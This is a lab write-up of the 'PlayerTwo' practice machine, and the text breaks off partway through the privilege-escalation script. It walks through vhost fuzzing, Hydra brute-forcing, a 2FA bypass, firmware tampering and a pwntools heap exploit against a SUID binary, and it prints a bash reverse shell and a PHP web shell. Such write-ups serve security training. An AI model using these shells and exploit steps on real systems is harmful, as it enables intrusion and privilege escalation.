@@ -1,0 +1,1074 @@
+PlayerTwo
+
+23rd June 2020 / Document No D20.100.78
+Prepared By: MinatoTW
+Machine Author(s): MrR3boot & b14ckh34rt
+Difficulty: Insane
+Classification: Official
+Synopsis
+
+PlayerTwo is an insane difficulty Linux machine featuring multiple technologies and
+vulnerabilities. Vhost and directory enumeration yields source code for the protobuf service, that
+is used to query the server. This provides credentials used to login and gain access to firmware.
+The firmware is modified in order to execute commands on the server and gain a foothold. The
+server is found to be passing messages over MQTT, and contain a user's SSH key. This user is
+found to have access to a SUID binary that is vulnerable to multiple vectors, leading to a root
+shell.
+
+Skills Required
+
+      Web Enumeration
+      Scripting
+      Reverse Engineering
+      Exploit Development
+
+Skills Learned
+
+      Twirp and Protobuf
+      MQTT
+      Heap Exploitation
+Enumeration
+
+Nmap
+
+ports=$(nmap -p- --min-rate=1000 -T4  10.10.10.170 | grep ^[0-9] | cut -d '/' -f
+1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sC -sV 10.10.10.170
+
+Nmap reveals three open ports corresponding to SSH (22), Apache (80) and a PHP built-in server
+(8545) respectively. The script scan of port 8545 resulted in an error message containing the
+string twirp_invalid_route . Looking up this error bring us to Twirp, which is an RPC framework
+that facilitates service-to-service interaction.
+
+Apache
+
+Browsing to port 80 reveals an image describing an error.
+The error asks us to contact MrR3boot@player2.htb . It's possible that the server uses vhost
+based routing. Let's add the following entry to the hosts file and browse to it.
+
+   10.10.10.170 player2.htb
+
+This time we see a web page instead of the error image.
+
+The page refers to the company's adoption of the protobs protocol, which has been customized.
+Vhost Enumeration
+
+Let's use wfuzz to discover any other vhosts. We can use this subdomains wordlist from SecLists
+to bruteforce the vhosts.
+
+   wfuzz -w subdomains-top1million-5000.txt -t 100 -H "Host: FUZZ.player2.htb" --hh
+   102 -u http://10.10.10.170
+The command above discovers vhosts of the form FUZZ.player2.htb where FUZZ is replaced
+with words from the wordlist. On running the scan initially, the default response size is found to
+be 102, which is hidden from the results.
+
+The scan was able to discover the subdomain product.player2.htb . Let's add this entry to the
+hosts file.
+
+   10.10.10.170 player2.htb product.player2.htb
+Browsing to the vhost reveals a login page titled Protobs Portal , which is the product
+mentioned earlier.
+Gobuster
+
+Let's enumerate files and folders on both vhosts using Gobuster, as we don't have any
+credentials at this point.
+
+   gobuster dir -u http://player2.htb -w /usr/share/wordlists/dirbuster/directory-
+   list-1.0.txt -t 50 -x php
+
+player2.htb is found to host two interesting folders, i.e. generated and proto . Let's note this
+and move to the product vhost.
+
+The scan revealed a few interesting entries. Browsing to /mail , /totp and /home redirects us
+back to the login page. However, the /api folder returns a 403 error.
+
+Let's scan this folder next.
+The /api folder is found to contain a /totp endpoint, which return a 200 OK . Let's navigate to
+this in the browser.
+
+The API throws an error on sending a GET request. Let's send a POST request using curl.
+
+This time we come across a different error, stating that we have an Invalid Session . Searching
+about TOTP yields this wiki, according to which the Time-based One-time Password algorithm
+(TOTP) is used to generate One Time Passwords (OTP) based on the current time.
+
+Twirp
+
+Accessing the TOTP service might need authorization or further access. Let's enumerate port
+8545 for any interesting information. Looking at the Twirp documentation, it's found that
+services are defined in .proto files. We recall seeing a /proto folder from previous fuzzing of
+the main vhost. It's possible that this folder could contain such files.
+
+We were able to find a file named generated.proto . Let's look at its contents.
+The file defines a service called Auth for the twirp.player2.auth package. The service defines
+a method GenCreds() which takes in the count (Number) and returns credentials (Creds).
+We can use this file to generate a client for this service. This can be done in various languages
+such as Go, Python, PHP etc. This tutorial describes how the cURL can be used to interact with
+services.
+The protoc compiler can be downloaded from the GitHub releases.
+
+   mkdir proto; cd proto
+   wget
+   https://github.com/protocolbuffers/protobuf/releases/download/v3.12.3/protoc-
+   3.12.3-linux-x86_64.zip
+   unzip protoc-3.12.3-linux-x86_64.zip
+Let's issue a request for credentials.
+   curl -s -X POST -H "Content-Type: application/protobuf"
+   http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds | ./bin/protoc -I
+   . --decode twirp.player2.auth.Creds generated.proto
+
+This returns credentials in a name, pass value pair. Issuing repeated requests returns random
+credential pairs for multiple users. Trying to login with these credentials results in failure.
+Let's create a script to send 100 requests, which will hopefully capture all credentials stored by
+the service. We can use gawk to edit the generated userpass.txt in place, leaving only unique
+combinations.
+
+   #/usr/env/bash
+
+   echo "Finding Credentials..."
+
+   for i in `seq 1 100`
+
+   do
+
+       curl -s -X POST -H "Content-Type: application/protobuf"
+   http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds \
+
+       | ./bin/protoc -I . --decode twirp.player2.auth.Creds generated.proto \
+       | tr '\n' ' ' >> userpass.txt
+       echo >> userpass.txt
+
+   done
+
+   echo "Unique Credentials:"
+   gawk -i inplace '!a[$0]++' userpass.txt
+   cat userpass.txt
+
+After issuing chmod +x client.sh and running it, the following unique credentials are found.
+It's not efficient to test these credentials manually, so let's transform the data into a format that
+can be used with Hydra, in an online brute force attack.
+
+   cat userpass.txt | awk '{print $2,$4}' | sed 's/"//g' | sed 's/ /:/g' | sponge
+   userpass.txt
+The command above converts the username and password pair into the form
+username:password .
+
+Next, the following Hydra command can be used to bruteforce the login.
+   hydra -C userpass.txt product.player2.htb http-post-form
+   "/index:username=^USER^&password=^PASS^&Submit=Sign in:Nope"
+
+The command reads credentials from the userpass wordlist and attempts to login. The failure
+message is set to Nope , which is used to determine the login success.
+We were able to two sets of valid credentials. The credentials 0xdf / XHq7_WJTA?QD_?E2 are
+accepted, which takes us to the Two-Factor Authentication (2FA) step. The page asks us to provide
+either an OTP or a backup code.
+
+We came across the /api/totp endpoint during previous enumeration.
+Let's try to request this endpoint through the current authenticated session. Turn on Burp
+intercept and request the /api/totp endpoint through the browser.
+
+Hit CTRL + R to send the request to Repeater. Next, right-click and select Change request
+method to switch it to POST.
+This time the page returns Invalid action instead of Invalid session . Let's try sending a
+JSON with an action field.
+
+The API responds with Missing parameters . We can try requesting for various actions such as
+otp , totp , backup etc. which make sense in the context. It's found that the action
+backup_codes returns successfully.
+
+Entering the provided code into the 2FA prompt provides access to the home page.
+Alternate 2FA Bypass
+
+It's possible that the server compares the input action with the string backup_codes . We can try
+bypassing the check through PHP type juggling. Let's set the action to a non-string value such as
+true , which is a boolean.
+
+This passed the action check and we received the backup code. Here's how the application code
+might look.
+
+   if($action == "backup_codes") {
+          // Send backup code
+
+   }
+The == operator in PHP represents loose comparison. Setting $action to true satisfies the
+check because PHP treats any kind of string as a true value.
+
+Firmware Analysis
+
+That gives us access to the protobs interface. Clicking on the Access tab reveals a hyperlink to a
+PDF file.
+This contains documentation of the Protobs Firmware .
+The document describes how the firmware is signed and verified in order to prevent counterfeits.
+According to the document, the signature is calculated and prepended to the actual code i.e. the
+binary data.
+
+The flowchart above describes how the update and signature verification takes place. It can be
+seen that the firmware is booted after the signature verification.
+Looking at the bottom of the document, we come across a URL for the firmware as well as a
+/protobs page.
+Browsing to the /protobs page reveals a firmware verification application.
+
+Let's download and inspect the firmware locally.
+   wget http://product.player2.htb/protobs/protobs_firmware_v1.0.tar
+   tar xvf protobs_firmware_v1.0.tar
+
+The info.txt file contains licensing information while the version file records the firmware
+version as FIRMWAREVERSION=122.01.14,,703021, . Let's upload this tar file to the verification
+page and look at the response.
+The checks pass and the firmware is ready to be deployed. Let's inspect the binary file
+Protobs.bin .
+
+It appears to be just data. However, running binwalk on the file shows that there's an ELF present
+at an offset of 64 bytes.
+
+The document stated that the signature is present before the actual firmware code, which means
+that the first 64 bytes constitute the signature. We can extract the binary using the following
+command.
+   binwalk --dd='.*' Protobs.bin
+
+This time the file is successfully recognized as an ELF (executable binary). Let's open it up in
+Ghidra to look at the disassembly. Expand the symbol tree in the code browser and select the
+main function.
+
+The main() function calls wait_for_fkey() and then continues execution. Let's look at the
+wait_for_fkey() method.
+This method uses the system() function to change terminal settings using the stty command.
+We already know that the firmware is booted after verification, this gives us the chance to tamper
+with the code and execute malicious commands.
+
+Looking at the signing process above, we see that the signature is calculated using the program
+code and a hashing function. It's possible that the server might overlook some of the initial bytes
+of the program code, which will let us bypass the verification.
+We can use a hex editor such as HxD or 010 Editor to modify the firmware. Make a backup of
+Protobs.bin , open the original file in the editor and search for the string stty .
+Let's replace the string with a command such as:
+   ping -c 2 10.10.14.5;
+
+Copy the command and paste it while the cursor is at stty .
+
+Hit Ctrl +S to save the changes, and then use tar to package the firmware.
+   tar cvf firmware.tar Protobs.bin info.txt version
+
+Start a tcpdump listener and upload this firmware to the verification page.
+The signature should be verified successfully and the server should ping us back.
+Foothold
+
+Having confirmed command execution, we can now try to gain a reverse shell. Repeat the
+process above and replace the command with a bash reverse shell.
+
+   bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1";
+
+Save the firmware and archive it once again. A listener is stood up on port 4444 and the archive is
+uploaded.
+
+A shell as www-data is received.
+Looking at the running processes, we see that mosquito is running locally.
+Mosquito is an open-source MQTT broker used to pass messages when using devices or sensors.
+It uses the mqtt protocol, which is based on a publish-subscribe model. Each client can subscribe
+to topics, as well as publish information pertaining to those topics.
+Netstat shows port 1883 to be open, which is reserved with IANA for use with MQTT, and the
+default port for the mosquito server.
+
+Alternate Method
+
+After getting a shell, we can take a look at the source. Inspecting the contents of
+/var/www/product/protobs/verify.php we see the file upload logic.
+
+   <?php
+   <SNIP>
+   $filename = $_FILES["firmware"]["name"];
+   $uplfile = "uploads/".$filename;
+   move_uploaded_file($_FILES["firmware"]["tmp_name"],$uplfile);
+   if(file_exists($uplfile))
+   {
+
+        $newfile = rand().'.tar';
+        rename($uplfile,"uploads/".$newfile);
+        $newfile = "uploads/".$newfile;
+        $phar = new PharData($newfile);
+        $phar->extractTo("uploads/");
+        exec('rm uploads/info.txt');
+        exec('rm uploads/version');
+        exec('rm '.$newfile);
+        echo '<script>alert("Verifying signature of the firmware")</script>';
+        $efile = rand().'.bin';
+        exec('mv uploads/Protobs.bin uploads/'.$efile);
+        exec('./verify_signature.py uploads/'.$efile);
+        $verified = "uploads/".$efile.".verified";
+        if(file_exists($verified))
+        {
+
+              echo '<script>alert("It looks legit. Proceeding for provision test");
+   </script>';
+
+              exec('chmod +x uploads/'.$efile.'.verified');
+              exec('uploads/'.$efile.'.verified > /dev/null 2>&1 &');
+              exec('rm uploads/*');
+              echo '<script>alert("All checks passed. Firmware is ready for
+   deployment.");window.location="/protobs/";</script>';
+        }
+   <SNIP>
+The uploaded archive is moved to the uploads folder, and then its contents are extracted using
+PharData::extractTo() . Next, the signature is verified and the file is executed. Finally, the script
+executes rm uploads/* . This command only deletes the files that are present in the root
+uploads folder, while ignoring any subfolders and contained files. We can exploit this by creating
+an archive with a sub-folder and placing a web shell in it.
+
+   mkdir shell
+   echo "<?php system($_GET['cmd']); ?>" > shell/exec.php
+   tar cvf firmware.tar Protobs.bin info.txt version shell/
+The commands above will create a folder named shell with the web-shell exec.php in it.
+
+Browse to the upload page and submit this archive. The shell should be accessible once the
+verification process completes.
+Lateral Movement
+
+We can use reverse port forwarding it in order to make port 1883 accessible and interact with it.
+First add a new temporary user locally with a fake shell.
+
+The following iptables rules can be used to restrict incoming connections to 10.10.10.170 only.
+   iptables -A INPUT -p tcp --dport 22 --source 10.10.10.170 -j ACCEPT
+   iptables -A INPUT -p tcp --dport 22 -j DROP
+   ## Use iptables -F to delete rules later
+
+Ensure that the SSH server is running locally and issue the following command from the shell.
+   ssh -R 1883:127.0.0.1:1883 temp@10.10.14.5 -N
+
+After which, port 1883 should be active on our localhost.
+
+The mosquito_sub utility can be used to subscribe to a particular topic and receive messages.
+   apt install mosquitto-clients
+
+According to the documentation, the topics within the $SYS hierarchy are used to retrieve
+information about the broker. Let's try to subscribe to this topic.
+   mosquitto_sub -t '$SYS/#' -h 127.0.0.1 -p 1883
+The # symbol acts as a wildcard and subscribes to all topics within $SYS .
+
+It's found that the server retrieved a SSH private key and published it to a topic. This key might be
+used for signature verification or another purpose. Let's save this key in a file and look at the
+system users.
+
+We can see the user observer . Let's try to login as this user with the SSH key.
+
+The login was successful and the user flag can be read.
+The Development folder contains a Protobs release notes PDF.
+This can be transferred locally using scp.
+   scp -i id_rsa observer@player2.htb:~/Development/Protobs-Release-Notes.pdf .
+Privilege Escalation
+
+Examining the filesystem for SUID files reveals a Protobs binary.
+   find -perm -4000 2>/dev/null
+
+Looking at the binary, it's found to be using a non-system libc that is present in the same folder.
+
+This can be confirmed by looking at the RUNPATH for the binary.
+The RUNPATH is a hardcoded path where the binary looks for shared libraries. Let's transfer all
+three files using scp.
+   scp -i id_rsa observer@player2.htb:/opt/Configuration_Utility/Protobs .
+   scp -i id_rsa observer@player2.htb:/opt/Configuration_Utility/libc.so.6 .
+   scp -i id_rsa observer@player2.htb:/opt/Configuration_Utility/ld-2.29.so .
+
+We can replicate the original folder structure to satisfy the RUNPATH requirement. Looking at the
+libc.so.6 library, it's found to be stripped of symbols. We can download the debug version of
+this library.
+
+The GLIBC version is found to be 2.29-0-ubuntu2 , debug symbols for it can be found here. Let's
+download the package and extract the library from it.
+
+   wget http://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb
+   ar x libc6-dbg_2.29-0ubuntu2_amd64.deb
+   tar xvf data.tar.xz
+   cd ./usr/lib/debug/lib/x86_64-linux-gnu/
+   mkdir /opt/Configuration_Utility/.debug
+   cp libc-2.29.so /opt/Configuration_Utility/.debug/
+GDB will automatically look in /opt/Configuration_Utility/.debug/ for symbols. We'll be
+using GEF to make debugging easier, the installation instructions for GEF can be found here.
+Looking at the PDF that we found earlier, we find some details related to Protobs.
+
+The release cycle details inform us about minor bugs in the console utility.
+Reverse Engineering
+
+We can examine the binary protections using checksec . This reveals that all protections except
+PIE are enabled.
+
+As the binary isn't PIE (Position Independent Executable) compatible, it will always load at the
+same memory address i.e. 0x3fe000 . The Full RELRO protection will prevent us from
+overwriting GOT addresses in the binary. Let's execute it and look at the program flow.
+The binary allows us to create, read, delete and list configurations.
+
+While creating a configuration, we're prompted for various attributes as well as a description. The
+binary asks us for the size of description before taking in the contents.
+As we can see in the image above, the description was trimmed down to 10 characters. Let's
+open it up in the Ghidra code browser for further analysis. Find the entry function in the symbol
+tree. The first argument in the call to _libc_start_main() is always the main function.
+
+Double-click on it to navigate to the function, and then type L to rename it to main .
+Looking at the function, we see it setting up the buffers, sleeping and printing messages. It then
+calls a function FUN_004009c7() . This function just prints ASCII art and returns.
+It then drops into a loop with another function. This must be the function where main operation
+takes place. Looking at the function, we see that it takes in user input and calls functions based
+on that.
+
+Note: The functions were renamed to depict their actual actions.
+The menu() function just prints the menu and returns. The list_configs() function loops
+through a global array that stores all user generated configurations. It lists out all active
+configurations along with their index.
+
+It appears that the binary allows a maximum of 15 configurations to be created. Let's look at the
+create_config() function next.
+The function calls get_last_config() to find the index of the last created configuration. The
+program exits if there are 15 configurations already. Next, it calls malloc() to allocate a chunk of
+size 0x38 . This chunk address is added to the global array and assigned to the configuration
+struct.
+A new configuration structure type can be defined by right-clicking in the Data Type Manager
+pane > New > Structure .
+
+The structure should look like the image below.
+
+We can now retype any variable to a configuration * structure pointer. Let's continue analysis
+of the function.
+It then prompts the user for various configuration settings, and saves them in their appropriate
+fields in the configuration structure.
+
+Next, it asks for the size of the configuration description. If the provided size is greater than 0, the
+description is read into the name buffer. It then checks if the input size is the same as the size
+provided earlier, and if not the string is terminated appropriately. This means that we can't
+overflow the heap directly through user input. The malloc() function is called again to allocate a
+chunk of the provided size, and a pointer is saved in the configuration struct.
+The function then drops into a loop in order to copy the input buffer to the description buffer
+byte by byte. On observing closely, it can be seen that bytes are copied until the counter is equal
+to the length of the input buffer. This will copy an extra null byte from the end of the string to the
+allocated chunk, causing a single byte overflow. Let's note this down and move to the
+read_config() function.
+This function reads the configuration at an index and prints various attributes using printf() .
+The description is printed only when a pointer is present. It should be noted that printf() stops
+printing data when it sees a null byte.
+Let's look at the delete_config() function next.
+
+This function takes in an index for a configuration as well. It first checks if the description pointer
+exists, and if it does then the chunk is freed. Next, the entire configuration is freed and the
+pointer is nullified.
+This will prevent a Use-After-Free bug as the same pointer can't be used again. However, we note
+that the pointer to the description chunk isn't nullified. This pointer will remain a part of the
+heap data until it is overwritten by some other data. The presence of this pointer results in a Use-
+After-Free condition.
+It can be exploited by creating another configuration of 0 description size, which will result in the
+persistence of the same pointer.
+We can take away the following points from the analysis above:
+
+      Each configuration is 56 bytes in size, with the last field pointing to the description.
+      The size of the description chunk is user-controlled.
+      There is a single byte overflow due to the null-byte being copied.
+      A Use-After-Free condition exists due to the description pointer present in freed chunks.
+Exploit Development
+
+Let's define methods to create, read and delete configurations using pwntools.
+
+#!/usr/bin/python3
+
+from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+gdbscript = '''
+stub sleep
+c
+'''
+
+p = process("/opt/Configuration_Utility/Protobs")
+gdb.attach(p, gdbscript)
+
+def create(size, description, name='test', contrast='1', gamma='2', x_axis='3',
+
+y_axis='4', controller='6'):
+
+log.info("Creating configuration")
+
+p.sendlineafter("protobs@player2:~$ ", "2")
+
+p.sendlineafter(" [ Game                     ]: ", name)
+
+p.sendlineafter(" [ Contrast                 ]: ", contrast)
+
+p.sendlineafter(" [ Gamma                    ]: ", gamma)
+
+p.sendlineafter(" [ Resolution X-Axis ]: ", x_axis)
+
+p.sendlineafter(" [ Resolution Y-Axis ]: ", y_axis)
+
+p.sendlineafter(" [ Controller               ]: ", controller)
+
+if size > 0:
+
+p.sendlineafter(" [ Size of Description ]: ", str(size))
+
+p.sendlineafter(" [ Description              ]: ", description)
+
+else:
+
+p.sendlineafter(" [ Size of Description ]: ", str(size))
+
+def read(index):
+       log.info(f"Reading configuration at index: {index}")
+       p.sendlineafter("protobs@player2:~$ ", "3")
+       p.sendlineafter(" [ Config Index ]: ", str(index))
+       return '\n'.join(p.recvlinesS(8))
+
+def delete(index):
+       log.info(f"Deleting configuration at index: {index}")
+       p.sendlineafter("protobs@player2:~$ ", "4")
+       p.sendlineafter(" [ Config Index ]: ", str(index))
+
+def main():
+       create(10, "test1234")
+       print(read(0))
+       delete(0)
+
+p.interactive()
+
+if __name__ == "__main__":
+       main()
+The gdb.attach() method is used to attach the debugger to the process after it starts. The stub
+command from GEF is used to skip calls to sleep() . The create() method takes in the size and
+description to send, while the rest of attributes are set to default. The read() method accepts an
+index value and returns the configuration. Finally, the delete() method accepts an index value
+and deletes that configuration. We can create a test configuration and then delete it.
+
+Use After Free
+
+Now that we have a working script, let's proceed to exploit the UAF. Let's create two
+configurations and then free them. Edit the main method with the following:
+
+   def main():
+          create(10, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+          p.interactive()
+
+Execute the script and then hit Ctrl + C in GDB to examine the heap.
+The heap chunks command can be used to examine the chunks in GEF.
+
+We see four chunks with two pairs of size 0x40 (configuration) and 0x20 (description)
+respectively. Each time a chunk is freed, the first two data fields are populated to save fd and
+bk pointers. These pointers point to the forward and backward chunks. This is used by libc to
+maintain the list of free chunks that are available to the program. These lists are called Bins
+namely: fast bins, small bins, large bins, unsorted bins and tcache bins. A more in-depth
+explanation of heap and malloc internals can be found here.
+Glibc 2.26 introduced a new concept known as tcache (per-thread cache) bins. This was
+implemented to improve performance over the other bins. There are a maximum of 64 tcache
+bins, with each bin storing up to 7 chunks. The sizes of these chunks range from 24 to 1032 bytes
+on 64-bit systems. The heap bins command can be used to view the bins.
+
+As we can see, the tcache bins contain two active lists for sizes 0x20 and 0x40. The next time this
+program requests chunks of sizes 0x40 and 0x20, the allocator will return these chunks instead of
+creating new ones. This strategy is used to re-use existing chunks, hence saving time needed to
+create new chunks.
+Let's examine the heap memory manually.
+The image above shows all four chunks, where the configuration chunks are colored blue and the
+description chunks are colored green. As we can see, the first data field of the chunks were
+repurposed to store fd pointers. Tcache bins use a single linked list, meaning each chunk knows
+only about the next chunk in the list.
+For example, the fd field of the chunk at 0x25c2260 is set to 0, which means it's the first chunk in
+the list. However, the fd field of the chunk at 0x25c22c0 points to the next chunk i.e. 0x25c2260 .
+When the program next requests a chunk, the allocator will return the last chunk in the list i.e.
+0x25c22c0 followed by 0x25c2260 .
+It can also be seen that the last field in the blue chunks still point to the description chunks. This
+means that this field will exist even when this chunk is re-used. Let's request another chunk of
+size 0x40 and set the description size to be 0 . Hit c in GDB and then create another
+configuration.
+
+Next, hit Ctrl + C again in GDB and examine the chunks.
+It's observed that the total number of chunks still remain the same and there is one less chunk in
+tcache bins. A chunk with the name newtest can be seen at 0x25c22c0 .
+
+As expected, the last field of the new chunk still points to 0x25c2300 . This means that reading
+the details of this configuration should leak the contents of 0x25c2300 i.e. 0x25c22a0 . Continue
+the execution in GDB and read this configuration.
+
+We were able to successfully leak bytes of that address. Even though we're able to leak
+addresses, it's just a random heap address and is of no use. Additionally, we can't overwrite any
+GOT addresses due to the RELRO setting. This means that we need to leak other useful addresses
+such as libc addresses. This can be done with the help of an unsorted bin, which stores a pointer
+to the main_arena . The main_area is a libc symbol, which is of the type malloc_state . The
+following snippet is taken from glibc source code.
+
+   struct malloc_state
+   {
+       /* Serialize access. */
+       __libc_lock_define (, mutex);
+       /* Flags (formerly in max_fast). */
+       int flags;
+
+       /* Fastbins */
+       mfastbinptr fastbinsY[NFASTBINS];
+       /* Base of the topmost chunk -- not otherwise kept in a bin */
+       mchunkptr top;
+       /* The remainder from the most recent split of a small request */
+       mchunkptr last_remainder;
+       /* Normal bins packed as described above */
+       mchunkptr bins[NBINS * 2 - 2];
+
+   <SNIP>
+
+   };
+
+The main arena of a program is its initial heap, which stores various kinds of information
+including a pointer to the array holding the bins. The first element of the bins array is the
+unsorted bin list.
+By default, all freed chunks go into the tcache bins list. However, tcache only stores chunks up to
+1032 bytes in size. This means we can create a description that is more than this size and free it,
+which will result in the placement of the chunk in unsorted bin. Update the main method to the
+following:
+
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+          p.interactive()
+
+We create a chunk with a description of size 1050 . Another configuration is created later to
+prevent merging of the big chunk to the top chunk. Run the script and then examine the chunks
+again.
+
+We see a chunk of size 0x430 amongst the other chunks. Looking at the bins, we see the
+following.
+Our freed chunk was successfully placed in the unsorted bin. Let's inspect this chunk.
+
+As expected, the first field of this chunk points to an address in main_arena at an offset of 96.
+We should be able to leak this address if we continue execution, create a new configuration and
+read it.
+The difference between main_arena and the libc base address can be found using GDB.
+
+It's found to be at an offset of 0x1e4c40 from the base address. Let's implement this in our
+script.
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+          p.interactive()
+
+The script leaks the address and then subtracts the offset to obtain the libc address.
+
+We are now able to leak the libc base address, which can be used to resolve various symbols.
+Note: Sometimes the address might contain null bytes in between, resulting in partial output due
+to printf() .
+
+Null Byte Poisoning
+
+We need to leverage this leak by finding a way to write addresses. We already know about the
+null-byte overflow in the description field. Let's try to observe this behavior.
+
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+          ## Two fake configs to use up existing chunks
+          create(1050, "test1234")
+          create(10, "test1234")
+          create(10, "test1234")
+          delete(4)
+          create(350, "test1234")
+          delete(4)
+          p.interactive()
+After the leak, we create two more configurations to use up the free chunks. Next, we create a
+configuration with a description size of 10 and then free it. This is followed by another
+configuration of size 350. Let's run this script again and examine the heap.
+
+We see three new chunks at the bottom. Even though we requested chunk of size 10, it's
+observed that the allocator returned a chunk of size 0x20 (32) bytes. This is because the
+minimum size of a chunk returned by malloc on 64 bit is 0x20, irrespective of the request size.
+
+The first field of every chunk is reserved for its metadata. The last bit signifies if the previous
+chunk is in use or not. While the remainder denote the size of the chunk i.e. 0x20. This field
+means that the effective usable size of the chunk is 0x20 - 0x8 i.e. 24 bytes. If we request a
+chunk of size 24 bytes and then enter 24 bytes of data, we should be able to overwrite the size
+field of the next chunk. This will turn 0x171 to 0x100, thus affecting the metadata.
+
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+          ## Two fake configs to use up existing chunks
+          create(1050, "test1234")
+          create(10, "test1234")
+          create(10, "test1234")
+          delete(4)
+          create(350, "test1234")
+          delete(4)
+          create(24, "A" * 24)
+          p.interactive()
+Let's run the script again and look at the chunks.
+
+We successfully wrote a null-byte to the size field and changed it to 0x100.
+
+Double Free
+
+A double free occurs when we try to free a chunk that has already been freed. This places the
+chunk on the free list twice, which gives us the ability to request the chunk and modify it while it's
+still on the free list. However, modern libc versions are protected against this attack.
+We delete chunk number 4, which frees both the configuration and description chunks. Next, we
+request another chunk and set the description size to be 0. This will lead to freeing of the same
+description chunk, causing a double free. The program detects this and exits after throwing an
+error.
+
+However, this check can be bypassed by overflowing a null-byte, which sets the previous in use
+flag to 0. To exploit this, we'll need to set up two description bins next to each other. This can be
+done by creating a configuration with description of size 0x40 - 8 (8 bytes for size field) and
+then deleting it. That should give us two free chunks of size 0x40 each, that can be re-used for
+configuration requests.
+
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+          ## Two fake configs to use up existing chunks
+          create(1050, "test1234")
+          create(10, "test1234")
+          create((0x40 - 8), "test1234")
+          delete(4)
+          create(10, "test1234")
+          create(350, "test1234")
+          p.interactive()
+
+The code above creates a chunk for a description of size 0x40 and then deletes it. Then we create
+two more configurations, which should re-use the two chunks. This should leave us with two
+description chunks of sizes 0x20 and 0x170 adjacent to each other.
+
+As we can see, we have two description chunks together. Let's delete both chunks and then
+overwrite the last byte of the final chunk.
+
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+          ## Two fake configs to use up existing chunks
+          create(1050, "test1234")
+          create(10, "test1234")
+          create((0x40 - 8), "test1234")
+          delete(4)
+          create(10, "test1234")
+          create(350, "test1234")
+          delete(5)
+          delete(4)
+          create(24, "A" * 24)
+          p.interactive()
+Both chunks are deleted and a description of size 24 is requested, We fill it and overflow the size
+field of the last chunk.
+
+Looking at the tcache bins, we see that the final chunk 0x1ad6870 is on the list for chunks of
+sizes 0x170.
+
+We also have a pointer to this chunk present in the freed chunk at 0x1ad6810 .
+
+Let's create a chunk of size 0 and then free it, which will cause a double free on 0x1ad6870 .
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+
+          ## Two fake configs to use up existing chunks
+          create(1050, "test1234")
+          create(10, "test1234")
+
+          create((0x40 - 8), "test1234")
+          delete(4)
+          create(10, "test1234")
+          create(350, "test1234")
+          delete(5)
+          delete(4)
+          create(24, "A" * 24)
+          create(0, "")
+          delete(5)
+          p.interactive()
+
+Run the script and then examine the bins.
+
+We see that the same chunk 0x1492870 is present on two different lists at once. This means we
+have successfully bypassed the double free check and freed the same chunk twice.
+We can now request one of these chunks and poison the fd pointer. This fd pointer will be
+used used as a chunk the next time a request is made. One perfect address to overwrite is
+__free_hook in libc. This is called each time the function free() is called.
+
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+
+          ## Two fake configs to use up existing chunks
+          create(1050, "test1234")
+          create(10, "test1234")
+
+          create((0x40 - 8), "test1234")
+          delete(4)
+          create(10, "test1234")
+          create(350, "test1234")
+          delete(5)
+          delete(4)
+          create(24, "A" * 24)
+          create(0, "")
+          delete(5)
+
+          libc = ELF("/opt/Configuration_Utility/libc.so.6", checksec=False)
+          libc.address = libc_base
+          free_hook = libc.symbols['__free_hook']
+          create((0x100 - 8), p64(free_hook))
+
+          p.interactive()
+
+We rebase the libc to the leaked address and then find the address to __free_hook . Then a
+chunk of size 0x100 - 8 is requested and its fd is populated with the hook address.
+
+Running the script and looking at the bins, we see that the chunk of size 0x100 was returned,
+while the chunk of size 0x170 is still present. We can also see that there is a new entry in the list
+i.e. the chunk at 0x7f296ce265a8 . This is the address of __free_hook , which means that we
+succeeded in poisoning the fd pointer.
+
+The next step is to request two new configurations both of size 0x170 -8 , which should end up
+giving us pointer to __free_hook .
+
+   def main():
+          create(10, "test1234")
+          create(1050, "test1234")
+          create(10, "test1234")
+          delete(0)
+          delete(1)
+
+          create(0, "")
+          leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
+          libc_base = leak - 96 - 0x1e4c40
+          log.success(f"Libc base address: {hex(libc_base)}")
+
